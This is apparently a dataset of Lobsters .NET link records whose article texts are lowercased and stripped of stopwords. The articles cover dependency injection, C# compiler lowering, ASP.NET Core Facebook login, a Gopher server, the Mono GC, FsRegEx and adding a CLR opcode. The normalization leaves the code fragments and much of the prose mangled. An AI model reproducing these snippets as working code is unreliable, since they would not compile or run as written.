soapbottle set public class windowwasher iwindowwasher public soapbottle soapbottle set private get assumption client satisfy dependency stated interface class many property one interface set using objectcontainers like spring nowadays support better support setter member injection make interface injection pattern moot realize though even container give tighter contract guarantee client actually use particular container may may issue youand finally constructor injection public class windowwasher readonly soapbottle soapbottle public windowwasher soapbottle soapbottle thissoap soap case required dependency stated constructor argument client provide order construct object class constructor injection doubt class need order constructed use provided object used passed together dependency may rely without magic complicated contract constructor implementation enforce required v optional dependenciesin humble opinion constructor injection worth using though case may convenient support property interface injection workaround constructor injection cut container support flavor imho aim constructor injection use alternative last resort come container support also several flavor discussno containeryep right perfectly acceptable use container mean quite bit hand coding code easy navigate analyzefor instance scent scent new scent flav flov bool issoft true soap soap new soap scent issoft soapbottle soapbottle new soapbottle soap windowwasher washer new windowwasher soapbottle washerwipeitgood many dependency though every time class change constructor signature assuming constructor injection client client forth changed good ides without much trouble absence quite hassle also result larger change log obscure change relevant commits di container responsible satisfying dependency help cut code required wire object together container better job others may make coder life hassle arguably better withoutrequiring explicit configurationthe earliest spring version required configure dependency xml file avoid cost hardly save code make harder without additional tooling figure object graph put togetherthere also plenty framework allow bind interface implementation type instance via code required done part bootstrapping code hence easy find declare everything potentially want injected elsewhere fantastic either though scale poorly larger project make harder modularize part codeconvention meta data basedspring later version loosened requirement configure everything explicitly support binding via class path scanning class picked framework annotated spring follows simple rule like single implementation found interface must intended binding interfacemy personal favorite framework java land guice provides nice mix explicit configuration code heuristic try resolve instance lazily instance referring class try instantiate pick either nonargs constructor single constructor annotated inject even class never explicitly configured another great feature imho though universally loved annotate interface refer default implementation override casebycase based via explicit configuration need itcode comparable guice would look like implementedby windowwasher public interface iwindowwasher void wipeitgood public class windowwasher iwindowwasher readonly soapbottle soapbottle inject public windowwasher soapbottle soapbottle thissoapbottle soapbottle void wipeitgood case need use interface rather class directly code would require explicit configurationwhat like exactly make people say like di believe framework used rather pattern difference minimal surface pretty huge impact day day experience nutshell think framework either use much magic ok neat framework try help stack trace remain small resolution rule simple predictable result increasing boot time second fails error reporting make easy figure quickly thing went wronguse little magic instead writing code instantiate class needed stuck gigantic blob code registering possible instantiation front worse declare gigantic xml file thanks many developer say blame balance struck right like case guice think di definitively boon even without good framework think pattern useful much le convincingnot convinced let briefly go alternative dependency injectionjust construct dependency yourselfpublic class windowwasher soapbottle soapbottle public windowwasher scent scent new scent flav flov bool issoft true soap soap new soap scent issoft soapbottle new soapbottle soap noone except simplest simplest case example another class need soap bottle go motion end lot code reasonable implementation use static factoriespublic class soapbottlefactory static soapbottle get set idea get soap bottle instance via factory directly also guarantee outside code change instance factory system running open bunch potential problemsyou still need bootstrapping code set dependency much like using dependency injection without guarantee may sound convenient able use code without dependency satisfied upfront probably going cause bug pointbasically using static factory pattern work fine dependent programmer using disciplined hell programmer finally service locatorwhat exactly mean seems depend ask basically indirection getting dependency instead getting directly factory stating dependency require ask service locator instance requireif get instance locator statically much different static factory pattern potential problem come seems common understanding pattern generally discouragedconcludingdependency injection useful pattern language like java c language different solution service assembly might resemble di somewhat entirely different common probably good implementation explicit expect environment function keep assumption environment code run minimumwhen decide use di selecting container support pattern help cut plumbing code may able neat trick eg aop said di without container viable even use di make religion using new create instance crime
398,Lobsters,dotnet,"C#, F#, .NET programming",Klip: A simple programming language intended as a language implementation tutorial,https://github.com/DatCodingGuy/Klip,klip simple programming language intended language implementation tutorial,,klip simple compiled programming language wrote help others understand write programming language writing programming scripting language number year realise lack example code tutorial thus wrote klip language simple example one might start writing programming language due reason created programming language fullfeatured enough feature used base anyone looking create programming language feature functional language function variable printing screen input keyboard elseif else statement repeat loop loop included nt want spoonfeed whoever wanting learn create programming language want add loop figure really nt hard klip come two part klip runtime kliprt klip compiler kliprt simple program able run lowlevel code would nt go far say virtual machine nt work low level like virtual machine execute lowlevel code generated klip compiler klip compiler take highlevel code input compiles lowlevel code kliprt execute even though say simple programming language already understanding programming language work may still confusing future plan create tutorial series aim teach people create programming language starting basic leading level klip people hopefully enough understanding continue developing language klipbundlec zip file download contains source code compiled program example code compile execute also example code example folder
400,Lobsters,dotnet,"C#, F#, .NET programming",Lowering in the C# Compiler (and what happens when you misuse it),http://www.mattwarren.org/2017/05/25/Lowering-in-the-C-Compiler/,lowering c compiler happens misuse,lowering c compiler happens misuse roslyn want write language lowering walter bright lowering language design roslyn compiler source lowering look like c compiler lowering srccompilerscsharpportablelowering equivalent localrewriter folder java happens misuse twitter competition gist output http sharplabio intput http sharplabio sharplabio total score result schabse laks take thing far honourable mention hackernews rprogramming rcsharp,lowering c compiler happens misuse may word turn always thought compiler magic syntactic sugar actually known technical term lowering c compiler aka roslyn us extensively well quote want write language give u idea lowering one semantic technique obvious hindsight took andrei alexandrescu point called lowering consists internally rewriting complex semantic construct term simpler one example loop foreach loop rewritten term loop rest code deal loop turned uncover couple latent bug loop implemented nice win also used rewrite scope guard statement term tryfinally statement etc every case found semantic processing win implementation walter bright author programming language still sure mean read eric lippert post subject lowering language design contains quote common technique along way though compiler lower highlevel language feature lowlevel language feature language aside like reading roslyn compiler source may like post written lowering look like c compiler used lowering one oldest recognised example code using systemcollectionsgeneric public class c public ienumerable int foreach var value new yield return value turned public class c compilergenerated private sealed class ienumerable int ienumerable ienumerator int idisposable ienumerator private int private int private int linitialthreadid public c private int private int private int value int ienumerator int current debuggerhidden get return object ienumeratorcurrent debuggerhidden get return debuggerhidden public int linitialthreadid environmentcurrentmanagedthreadid debuggerhidden void idisposabledispose bool ienumeratormovenext int num num num return false else new int null return false value value return true debuggerhidden void ienumeratorreset throw new notsupportedexception debuggerhidden ienumerator int ienumerable int getenumerator c linitialthreadid environmentcurrentmanagedthreadid else new c return debuggerhidden ienumerator ienumerablegetenumerator return thissystemcollectionsgenericienumerable getenumerator iteratorstatemachine typeof c public ienumerable int c new c return yikes glad write code entire statemachine built allow original code haltedresumed time round loop yield statement c compiler lowering turn roslyn compiler lot lowering might think take look code srccompilerscsharpportablelowering vbnet equivalent see following folder correspond c language feature might familar lambda ie x xname iterators used yield async keyword however look bit deeper localrewriter folder see lot scenario might never considered lowering big thankyou due past present c language developer designer work u imagine c highlevel feature stuck writing hand would like writing java happens misuse course real fun part misusing outright abusing compiler set little twitter competition much lowering could get compiler u ie highest ratio input line code output line following rule see gist info many line want within method single line longer char get score divide expanded line original line based default output formatting http sharplabio reformatting allowed format intput however want ie make use full char must compile warning http sharplabio allows c feature anything sensible run modify code already ie public class c public void add async public void easy add new using declaration count towards line count instance following code interactive version available sharplabio using system public class c public void func string test blah tostring count line original code code inside method counted expands line line code inside brace class c counted giving total score public class c compilergenerated serializable private sealed class c public static readonly c c public static func string static c note type marked beforefieldinit c c new c c internal string return blah public void c c null c c new func string c c result first place entry following entry schabse laks contains linesofcode inside method using systemlinq using systemcollectionsgenericienumerable dynamic public class c public void null select async x await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await xx expands impressive line code yep read right score main trick figured adding line input increased score ie scale superlinearly although take thing far compiler bail pretty impressive error message error expression long complex compile top top result member roslyn compiler team disqualified maybe kind handicap applied even playing field honourable mention however entry whilst make top still worth mention due ingenuity involved discus post hackernews rprogramming rcsharp whichever take fancy
401,Lobsters,dotnet,"C#, F#, .NET programming",Facebook Login in ASP.NET Core,http://www.blinkingcaret.com/2017/05/24/facebook-login-asp-net-core/,facebook login aspnet core,external login provider aspnet core step registering website facebook facebook developer page setup facebook login aspnet mvc external login provider aspnet core facebook login using aspnet identity external login provider aspnet core aspnet identity core scratch external login provider aspnet core http aspnet core scratch,able user sign website using social medium account great way make website appealing requiring user create local account confirm email address might enough user go away especially something go wrong confirmation email example take bit long email get user inbox thankfully really easy setup aspnet core website social login blog post step step guide enable user login website using facebook using aspnet core using aspnet core identity even though simple setup social logins hood lot going interested nitty gritty detail definitely read blog post external login provider aspnet core step registering website facebook user sign website using facebook facebook need know website go facebook developer page click register become facebook developer couple step registration process go lead asked create appid appid identifier facebook us identify websiteweb application website redirects user facebook user sign redirect contain appid way facebook present confirmation screen user application name name web application get appid see screen top left corner appid click get started button facebook login section pick web add website url use localhost development ignore step setting website callback url would required trigger login process javascript go dashboard make note app secret app id app secret need enable social logins using facebook setup facebook login aspnet mvc going describe process creating new project command line way description valid whatever platform using create new mvc project dotnet new mvc add nuget package cookie authentication middleware dotnet add package microsoftaspnetcoreauthenticationcookies finally facebook authentication middleware dotnet add package microsoftaspnetcoreauthenticationfacebook need add configure cookie facebook authentication middlewares aspnet application pipeline add configure method startupcs public void configure iapplicationbuilder app ihostingenvironment env iloggerfactory loggerfactory appusecookieauthentication new cookieauthenticationoptions authenticationscheme applicationcookie automaticauthenticate true appusefacebookauthentication new facebookoptions authenticationscheme facebook appid yourappid appsecret yourappsecret signinscheme applicationcookie appusestaticfiles appusemvc route routesmaproute name default template controllerhome actionindex id last thing need add action method start process signing user using facebook example account controller add action method public iactionresult facebooklogin var authproperties new authenticationproperties redirecturi urlaction index home return challenge authproperties facebook run web application go accountfacebooklogin able login using facebook want check claim get added user sign add indexcshtml useridentityisauthenticated foreach var claim userclaims p b claimtype b claimvalue p else p user signed p note indepth explanation challenge authentication middleware work read external login provider aspnet core facebook login using aspnet identity previous section described set facebook authentication middelware log user directly setting signinscheme cookie middleware set automaticauthenticate sentence confusing really stop read external login provider aspnet core going assume setup aspnet identity project done yet good guide aspnet identity core scratch edit startupcs class add facebook authentication middleware public void configure iapplicationbuilder app ihostingenvironment env iloggerfactory loggerfactory appuseidentity appusefacebookauthentication new facebookoptions appid yourappid appsecret yourappsecret authenticationscheme facebook appusestaticfiles appusemvc specify signinscheme previous section main authentication scheme name one actually add principal httpcontext identityapplication specify signinscheme default identityexternal corresponds cookie authentication middleware added aspnet identity configured automaticauthenticatefalse mean set httpcontextuser log user way take advantage authentication middleware configured way manually invoke configuring challenge specify redirect url controller action reason controller action perform aditional step example create local account user start process authenticating user using facebook way previous section however aspnet identity signinmanager class method want use action method issue challenge look like public iactionresult login var property signinmanagerconfigureexternalauthenticationproperties facebook urlaction externallogincallback account return challenge property facebook added externallogincallback action accountcontroller user redirected facebook successful authentication simplified version controller action public async task iactionresult externallogincallback externallogininfo info await signinmanagergetexternallogininfoasync infoprincipal iprincipal claim facebook infoproviderkey unique identifier facebook user signed infologinprovider string external login provider name case facebook sign user local account associated login provider var result await signinmanagerexternalloginsigninasync infologinprovider infoproviderkey ispersistent false resultsucceeded false local associated account associate local user account external login provider await userinmanageraddloginasync auseryoullhavetocreate info return redirect recommend reading external login provider aspnet core lot nuance going also need enable http check http aspnet core scratch related
402,Lobsters,dotnet,"C#, F#, .NET programming",pgodwin/GopherServer: A Gopher Server implemented in C#,https://github.com/pgodwin/GopherServer,pgodwingopherserver gopher server implemented c,gopherserver config option provider wordpressprovider r provider macintosh garden provider fileprovider mono support client support classic macintosh todo license credit anglesharp html agility pack newtonsoftjson sqlitenetpcl oysteinkrog gmailcom sqlitenetextensions wordpressrestapi,gopherserver gopher server implemented c simple socket server implemented gopherserver concept provider return result selector provider two method implement void init baseresult getresult string selector model result item type etc helper gopherservercore provider configured appconfig sample provider written demonstrate different example provider pull request welcome config option configuration option currently via gopherserverexeconfig file work undertaken improve way server provider configured boundip ip address socketserver listen boundport port socketserver listen publichostname address use directoryresults publicport port use directoryresults resizeimages truefalse whether image resized ie proxying image gif useful lowmemory target large image consume much memory maximumwidth int maximum width resized image maximumheight int maximum height resized image resampleimages truefalse whether image resampled lower colour depth outputting gif image bitdepth always maximum colour maximumbitdepth bitdepth image resampled depend target platform eg early macintosh machine might best keep thing colour providername gopherserverprovider use server see provider wordpressprovider wordpressprovider consumes wordpress rest api allows blog browsed gopher client use set add key providername value gopherserverproviderswpjson adjust add key wordpressproviderurl value url url provider support proxying gif webpage gopher give go r provider r provider advanced example showing bulid database backed gopher provider user register nickname site add r feed feed periodically downloaded cached db user able view r feed item gopher client macintosh garden provider provider proxy search result application page screenshots downloads good example building gopher proxy public website use set add key providername value gopherserverprovidersmacintoshgarden gopherserverexeconfig file fileprovider fileprovider allows gopherserver run like traditional gopher server serving directory file still progress currently hardcoded specific directory developed use make sure sqlite available platform window included set add key providername value gopherserverprovidersrss gopherserverexeconfig mono support able successfully run mono ubuntu lts along lowmemory footprint provider mean host gopherserver cheap linux hosting amazon lightsail lowend host client support successfully tested server following client classic macintosh lot client luck let know todo write much better documentation improve html text rendering improve socket server pretty much microsoft example async socket server lot room improvement improve configuration loading provider write client replace hacky code license credit software would possible without hardware contributor many open source project many released mit license software also released license see license anglesharp mit license mit copyright c anglesharp permission hereby granted free charge person obtaining copy software associated documentation file software deal software without restriction including without limitation right use copy modify merge publish distribute sublicense andor sell copy software permit person software furnished subject following condition copyright notice permission notice shall included copy substantial portion software software provided without warranty kind express implied including limited warranty merchantability fitness particular purpose noninfringement event shall author copyright holder liable claim damage liability whether action contract tort otherwise arising connection software use dealing software html agility pack mit license mit permission hereby granted free charge person obtaining copy software associated documentation file software deal software without restriction including without limitation right use copy modify merge publish distribute sublicense andor sell copy software permit person software furnished subject following condition copyright notice permission notice shall included copy substantial portion software software provided without warranty kind express implied including limited warranty merchantability fitness particular purpose noninfringement event shall author copyright holder liable claim damage liability whether action contract tort otherwise arising connection software use dealing software newtonsoftjson mit license mit copyright c james newtonking permission hereby granted free charge person obtaining copy software associated documentation file software deal software without restriction including without limitation right use copy modify merge publish distribute sublicense andor sell copy software permit person software furnished subject following condition copyright notice permission notice shall included copy substantial portion software software provided without warranty kind express implied including limited warranty merchantability fitness particular purpose noninfringement event shall author copyright holder liable claim damage liability whether action contract tort otherwise arising connection software use dealing software sqlitenetpcl copyright c krueger system inc copyright c øystein krog oysteinkrog gmailcom permission hereby granted free charge person obtaining copy software associated documentation file software deal software without restriction including without limitation right use copy modify merge publish distribute sublicense andor sell copy software permit person software furnished subject following condition copyright notice permission notice shall included copy substantial portion software software provided without warranty kind express implied including limited warranty merchantability fitness particular purpose noninfringement event shall author copyright holder liable claim damage liability whether action contract tort otherwise arising connection software use dealing software sqlitenetextensions copyright c twincoders sl permission hereby granted free charge person obtaining copy software associated documentation file software deal software without restriction including without limitation right use copy modify merge publish distribute sublicense andor sell copy software permit person software furnished subject following condition copyright notice permission notice shall included copy substantial portion software software provided without warranty kind express implied including limited warranty merchantability fitness particular purpose noninfringement event shall author copyright holder liable claim damage liability whether action contract tort otherwise arising connection software use dealing software wordpressrestapi apache license version january http wwwapacheorglicenses term condition use reproduction distribution definition license shall mean term condition use reproduction distribution defined section document licensor shall mean copyright owner entity authorized copyright owner granting license legal entity shall mean union acting entity entity control controlled common control entity purpose definition control mean power direct indirect cause direction management entity whether contract otherwise ii ownership fifty percent outstanding share iii beneficial ownership entity shall mean individual legal entity exercising permission granted license source form shall mean preferred form making modification including limited software source code documentation source configuration file object form shall mean form resulting mechanical transformation translation source form including limited compiled object code generated documentation conversion medium type work shall mean work authorship whether source object form made available license indicated copyright notice included attached work example provided appendix derivative work shall mean work whether source object form based derived work editorial revision annotation elaboration modification represent whole original work authorship purpose license derivative work shall include work remain separable merely link bind name interface work derivative work thereof contribution shall mean work authorship including original version work modification addition work derivative work thereof intentionally submitted licensor inclusion work copyright owner individual legal entity authorized submit behalf copyright owner purpose definition submitted mean form electronic verbal written communication sent licensor representative including limited communication electronic mailing list source code control system issue tracking system managed behalf licensor purpose discussing improving work excluding communication conspicuously marked otherwise designated writing copyright owner contribution contributor shall mean licensor individual legal entity behalf contribution received licensor subsequently incorporated within work grant copyright license subject term condition license contributor hereby grant perpetual worldwide nonexclusive nocharge royaltyfree irrevocable copyright license reproduce prepare derivative work publicly display publicly perform sublicense distribute work derivative work source object form grant patent license subject term condition license contributor hereby grant perpetual worldwide nonexclusive nocharge royaltyfree irrevocable except stated section patent license make made use offer sell sell import otherwise transfer work license applies patent claim licensable contributor necessarily infringed contribution alone combination contribution work contribution submitted institute patent litigation entity including crossclaim counterclaim lawsuit alleging work contribution incorporated within work constitutes direct contributory patent infringement patent license granted license work shall terminate date litigation filed redistribution may reproduce distribute copy work derivative work thereof medium without modification source object form provided meet following condition must give recipient work derivative work copy license b must cause modified file carry prominent notice stating changed file c must retain source form derivative work distribute copyright patent trademark attribution notice source form work excluding notice pertain part derivative work work includes notice text file part distribution derivative work distribute must include readable copy attribution notice contained within notice file excluding notice pertain part derivative work least one following place within notice text file distributed part derivative work within source form documentation provided along derivative work within display generated derivative work wherever thirdparty notice normally appear content notice file informational purpose modify license may add attribution notice within derivative work distribute alongside addendum notice text work provided additional attribution notice construed modifying license may add copyright statement modification may provide additional different license term condition use reproduction distribution modification derivative work whole provided use reproduction distribution work otherwise complies condition stated license submission contribution unless explicitly state otherwise contribution intentionally submitted inclusion work licensor shall term condition license without additional term condition notwithstanding nothing herein shall supersede modify term separate license agreement may executed licensor regarding contribution trademark license grant permission use trade name trademark service mark product name licensor except required reasonable customary use describing origin work reproducing content notice file disclaimer warranty unless required applicable law agreed writing licensor provides work contributor provides contribution basis without warranty condition kind either express implied including without limitation warranty condition title noninfringement merchantability fitness particular purpose solely responsible determining appropriateness using redistributing work assume risk associated exercise permission license limitation liability event legal theory whether tort including negligence contract otherwise unless required applicable law deliberate grossly negligent act agreed writing shall contributor liable damage including direct indirect special incidental consequential damage character arising result license use inability use work including limited damage loss goodwill work stoppage computer failure malfunction commercial damage loss even contributor advised possibility damage accepting warranty additional liability redistributing work derivative work thereof may choose offer charge fee acceptance support warranty indemnity liability obligation andor right consistent license however accepting obligation may act behalf sole responsibility behalf contributor agree indemnify defend hold contributor harmless liability incurred claim asserted contributor reason accepting warranty additional liability end term condition appendix apply apache license work apply apache license work attach following boilerplate notice field enclosed bracket replaced identifying information nt include bracket text enclosed appropriate comment syntax file format also recommend file class name description purpose included printed page copyright notice easier identification within thirdparty archive copyright yyyy name copyright owner licensed apache license version license may use file except compliance license may obtain copy license http unless required applicable law agreed writing software distributed license distributed basis without warranty condition kind either express implied see license specific language governing permission limitation license
403,Lobsters,dotnet,"C#, F#, .NET programming",Mono 5 adds new concurrent garbage collector,http://www.mono-project.com/news/2017/05/17/concurrent-gc-news/,mono add new concurrent garbage collector,concurrent gc using concurrent gc tuning nursery size typing pleasure,concurrent gc mono shipping new operation mode garbage collector concurrent garbage collection traditionally mono memory manager determined perform garbage collection collector pause mono running thread perform garbage collection done resumed execution thread concurrent garbage collection able perform collection old generation call major collection mostly concurrently application happens time program running major collection completed collector need pause mono thread brief period time end important feature user desktop workload like running xamarin studio visual studio mac well game mobile developer want application exhibit large pause large memory heap collected concurrent garbage collector enabled mono deployment default making available experimental option xamarin platform xamarinandroid xamarinios xamarinmac xamarintvos xamarinwatchos rolling default desktop first since friendly hardware received tuning interested hearing experience collector mobile application help u tune heuristic collector get sense affect real world application let u examine xamarin studio long gc latency cause typing delay noticeable lead bad typing experience pause noticeable u give taste concurrent collector improves thing used xamarin studio open build one biggest solution around open build xamarin studio frantically allocating object turn trigger garbage collector gc pause felt hiccup typing experiment run without concurrent mode enabled measured pause time gc run grouped bucket duration example bucket collection paused one thing keep mind axis logarithmic scale number short pause significantly larger result long pause higher completely gone even worst case concurrent gc show fewer pause even number significant quality life improvement plenty work left u get visible delay due garbage collector already solid pipeline improvement coming next release concurrent collector work open door many improvement beginning plan next provide default suitable different workload one end spectrum game constrained timing budget hand application care pause would like get throughput focus next year leverage work satisfy need scenario immediate roadmap expect mono introduce optional parallel major collection mode speed finishing pause large heap help outlier saw mono introduce optional parallel minor collection mode help workload high activity old object roslyn fall category using concurrent gc desktop enable concurrent gc using monogcparams env var set majormarksweepconc starting mono concurrent collector default desktop environment need use xamarinandroid xamarinios enable go project setting build option enable use experimental concurrent garbage collector option tuning nursery size graph show default mono mono nursery name give youngest heap generation talk performing minor collection talk performing collection limited nursery game interactive application might create lot small object rendering cycle longlived might able take advantage making nursery size larger reduces chance hit limit would trigger major collection manually trigger complete gc convenient time gccollect hope make tuning thing past introduce new game interactive feature new mode typing pleasure
404,Lobsters,dotnet,"C#, F#, .NET programming",Fun with pure C# and monads,https://blogs.msdn.microsoft.com/alazarev/2017/05/20/fun-with-pure-c-and-monads/,fun pure c monad,fun pure c monad article,fun pure c monad minute read article fascinated pure language like haskell unfortunately code c could complain neighbor day instead could also something really pure c actually called linq var sum new b new c new b c select b c know look pretty darn pure side effect given however much without side effect real world haskell pure language encapsulate side effect monad wanted write pure c also needed side effect c support side effect imperative style consolewriteline sum seems legit u functional people much fun could write pure still side effect whenever needed luckily define fancy monad help u public delegate io public static io r selectmany c r io func io c foo func c r bar var var b foo var b b var c bar b return c public static io combine io action b return new func io io x b return x public static io io func bool foo return foo combine consolewriteline screwed public static io r select r io func r foo return new func io r x foo x serious pure coding side effect var new io int consolewriteline return var b new io int consolewriteline b return var c new io int consolewriteline c return var sum b b c c let x b select b c x look real fun right henceforth really sneaky hide side effect place coworker least expects pure linq expression happy debugging
405,Lobsters,dotnet,"C#, F#, .NET programming",FsRegEx: composable regular expressions for F#,https://jackfoxy.github.io/FsRegEx/index.html,fsregex composable regular expression f,api reference f verbal expression tutorial semantic versioning github report issue license file,fsregex library provides composable f functionality nearly capabilites net regex class supporting uniform pipe forward composability regex feature except timeouts optionally compose f verbal expression natural language lazy evaluation ensures natural language composition imposes performance penalty fsregex library brings composable regular expression experience f composable function representing available regex functionality except timeouts target input string uniformly last parameter better support pipe forward composition partial application collection returned f array rather regex special collection better composability sacrificing lazy match evaluation timeout support shortcut function like capture group name make common multistep process single function fsmatch composable f wrapper type systemtextregularexpressionsmatch fsgroup composable f wrapper type systemtextregularexpressionsgroup basic functional operation fsregex exists fold foldback iter map among composable function fsregex speciall collection returned array lose advantange lazy match evaluation special collection provide underlying object always returned wrapper open fsregex let carregexp w car sprintf one car red car blue car match carregexp arrayiter fun printfn mvalue one car red car blue car let groupnumberregexp cod groupnumber end let groupnumbername groupnumber sprintf capture groupnumberregexp groupnumbername printfn library also provides composable verbal expression language constructing simple regular expression readable fashion open fsregex open systemtextregularexpressions open verbalexpressions let groupname groupnumber fsregex add cod begincapturenamed groupname repeatprevious endcapture end capture groupname printfn comparison using regex natively verbal expression retrieve database parameter connection string let testconnstring add name myconnstring connectionstring servermyserver databasemydatabase user idme passwordsecret encrypttrue trustservercertificatetrue enlistfalse let databasefromregex connectionstring regexmatch connectionstring dd atabase database group database value let databasefromfsregex connectionstring fsregex add dd atabase database capture connectionstring database databasefromregex testconnstring databasefromfsregex testconnstring printfn b true example show verbose descriptive verbal expression let databasefromverbosefsregex connectionstring fsregex anyof dd atabase begincapturenamed database add endcapture capture connectionstring database databasefromregex testconnstring databasefromverbosefsregex testconnstring printfn b true fsregex come comprehensive api documentation tutorial api reference contains documentation type module function library f verbal expression tutorial contains explanation natural language dsl syntax many usage example fsregex adheres semantic versioning long project minor version may breaking project reach minor enhancement backwardscompatible fsregex hosted github report issue fork project submit pull request long pull request include excellent unit test coverage include correct intellisense documentation adhere concept composability fsregex available public domain license allows modification redistribution commercial noncommercial purpose information see license file github repository val carregexp string val sprintf format printfstringformat module arrayfrom microsoftfsharpcollections val iter action unit array unit val obj val printfn format printftextwriterformat val groupnumberregexp string val groupnumbername string namespace system namespace systemtext namespace systemtextregularexpressions val groupname string val testconnstring string val databasefromregex connectionstring string string val connectionstring string multiple itemstype regex new pattern string regex overload member getgroupnames unit string member getgroupnumbers unit int member groupnamefromnumber int string member groupnumberfromname name string int member ismatch input string bool overload member match input string match overload member matchtimeout timespan member match input string matchcollection overload member option regexoptions regex pattern string regexregex pattern string option regexoptions regexregex pattern string option regexoptions matchtimeout systemtimespan regex regexmatch input string pattern string matchregexmatch input string pattern string option regexoptions matchregexmatch input string pattern string option regexoptions matchtimeout systemtimespan match val databasefromfsregex connectionstring b val connectionstring val databasefromverbosefsregex connectionstring b
406,Lobsters,dotnet,"C#, F#, .NET programming",Adding a new Bytecode Instruction to the CLR,http://www.mattwarren.org/2017/05/19/Adding-a-new-Bytecode-Instruction-to-the-CLR/,adding new bytecode instruction clr,adding new bytecode instruction clr coreclr opensource il intermediate language tl dr update beachhead implement new opcode clr jit kouji matsui step backward compatibility net framework apps component built previous version work without modification net framework side note comparing java c generic step blow trumpet c roslyn compiler matt warren c language design team update marcin juraszek mmjuraszek adding matt operator roslyn syntax lexer parser adding matt operator roslyn binder adding matt operator roslyn emitter il assembler opcodedef note available oneplace github step net interpreter step recompile coreclr checkout full diff morph phase step systemreflectionemit namespace step step disclaimercredit shared source cli essential amazon download copy edition peter drayton hackernews rprogramming,adding new bytecode instruction clr may word coreclr opensource fun thing instance find possible add new il intermediate language instruction runtime tl dr turn easier might think step need go update turn person idea see beachhead implement new opcode clr jit another implementation kouji matsui step first bit background information adding new il instruction clr pretty rare event last time done real net support generic added part reason net code good backwardscompatibility backward compatibility net framework net framework point release backwardcompatible apps built earlier version net framework word apps component built previous version work without modification net framework side note net framework break backwards compatibility moving precisely support generic could added deep runtime ie support il java took different decision guess around longer breaking backwardscomparability bigger issue see excellent blog post comparing java c generic info step exercise plan add new il instruction opcode coreclr runtime raving narcissist really see going name let introduce matt il instruction use like method private hidebysig static testmattopcodemethod x cil managed noinlining maxstack matt yay name il opcode ret actually bitbritish ie like blow trumpet going make matt opcode almost completely pointless going exactly thing calling mathmax x ie return largest number reason naming matt really like someone make version c roslyn compiler allows write code like consolewriteline print definitely want operator thing pronounced matt mat maybe matt warren work microsoft c language design team help seriously though anyone reading would like write similar blog post showing add operator roslyn compiler please let know love read update thanks marcin juraszek mmjuraszek use c program see adding matt operator roslyn syntax lexer parser adding matt operator roslyn binder adding matt operator roslyn emitter full detail defined opcode first step ensure runtime tooling recognise particular need il assembler aka ilasm able take il code testmattopcodemethod produce net executable net runtime source code nicely structured runtime devs make possible need make change opcodedef asrcincopcodedef bsrcincopcodedef opdef ceenewobj newobj varpop pu opdef ceecastclass castclass popref pushref inlinetype iobjmodel next opdef ceeisinst isinst popref pushi inlinetype iobjmodel next opdef ceeconvrun convrun inlinenone iprimitive next opdef unused inlinenone iprimitive next opdef ceematt matt inlinenone iprimitive next opdef unused inlinenone iprimitive next opdef ceeunbox unbox popref pushi inlinetype iprimitive next opdef ceethrow throw popref inlinenone iobjmodel throw picked first available unused slot added matt defined take value stack input executed single result pushed back onto stack note change made available oneplace github rather look like change done ilasm successfully assembly test code file helloworldil contains testmattopcodemethod shown λ ilasm exe outputhelloworldexe nologo helloworldil assembling helloworldil exe helloworldexe source file ansi assembled method helloworld main assembled method helloworld testmattopcodemethod creating pe file emitting class class helloworld emitting field method global class method resolving local member ref defs ref unresolved emitting event property global class resolving local member ref defs ref unresolved writing pe file operation completed successfully step however point matt opcode actually executed runtime coreclr throw exception know first simpler step wanted make net interpreter work made following change wire asrcvminterpretercpp bsrcvminterpretercpp void interpreter executemethod argslot retval bool pdojmpcall case ceeremun binaryintop bioremun break case ceematt binaryarithop bamatt break case ceeand binaryintop bioand break asrcvminterpreterhpp bsrcvminterpreterhpp void interpreter binaryarithopwork re else else op barem re remfunc else op bamatt re mattfunc added method would actually implement interpreted code asrcvminterpretercpp bsrcvminterpretercpp double interpreter remfunc double double return fmod interpreter mattfunc return interpreter mattfunc return float interpreter mattfunc float float return double interpreter mattfunc double double return fairly straightforward bonus point matt operator fully operational actually write il using run interpreted step however everyone want recompile coreclr enable interpreter want also make work real via justintime jit compiler full change make work spread across multiple file mostly housekeeping include checkout full diff interested significant part asrcjitimportercpp bsrcjitimportercpp void compiler impimportblockcode basicblock block oper gtumod goto mathmaybecallnoovf case ceematt oper gtmatt goto mathmaybecallnoovf mathmaybecallnoovf ovfl false mathmaybecallovf asrcvmjithelperscpp bsrcvmjithelperscpp jitumod dividend divisor hcimplend jitmatt x fcallcontract return x x hcimplend jitldiv dividend divisor fcallcontract summary change mean jit morph phase il containing matt op code converted fgmorphtree stmt return int lclvar int int lclvar int fgmorphtree stmt c return int c call help int helpercorinfohelpmatt rcx lclvar int rdx lclvar int note call helpercorinfohelpmatt finally compiled assembly code end looking like assembly listing method helloworld testmattopcodemethod int int int emitting blendedcode cpu avx optimized code rsp based frame partially interruptible final local variable assignment int rcx int rdx outargs lclblk lcl frame size sub rsp call corinfohelpmatt nop add rsp ret entirely sure nop instruction work main thing step clr also dynamically emit code runtime using method sit systemreflectionemit namespace last task add opcodesmatt field emit correct value matt opcode asrcmscorlibsrcsystemreflectionemitopcodescs bsrcmscorlibsrcsystemreflectionemitopcodescs internal enum opcodevalues castclass isinst convrun matt unbox throw ldfld private opcodes opcodestackchangeshift public static readonly opcode matt new opcode opcodevaluesmatt int operandtypeinlinenone int flowcontrolnext opcodeflowcontrolshift int opcodetypeprimitive opcodeopcodetypeshift int opcodestackbehaviourpopshift int opcodestackbehaviourpushshift opcodesizeshift opcodestackchangeshift public static readonly opcode unbox new opcode opcodevaluesunbox int operandtypeinlinetype int flowcontrolnext opcodeflowcontrolshift let u write code shown emits compiles executes matt opcode dynamicmethod method new dynamicmethod testmattopcode returntype typeof int parametertypes new typeof int typeof int typeof testclass module emit il var generator methodgetilgenerator generatoremit generatoremit generatoremit opcodesmatt use new matt il opcode generatoremit opcodesret compile il delegate us jitter underthehood var mattopcodeinvoker func int int int methodcreatedelegate typeof func int int int print consolewriteline via il emit mattopcodeinvoker print consolewriteline via il emit mattopcodeinvoker step finally may noticed cheated little bit step made change jit even though work efficient way due extra method call corinfohelpmatt also jit generally use helper function way instead prefering emit assembly code directly future exercise anyone read far taker would nice jit emitted efficient code instance write c code like thing matt opcode private static int maxmethod int x int return x x turned following il c compiler il import bgts ret ret jit run processed basicblocks importing 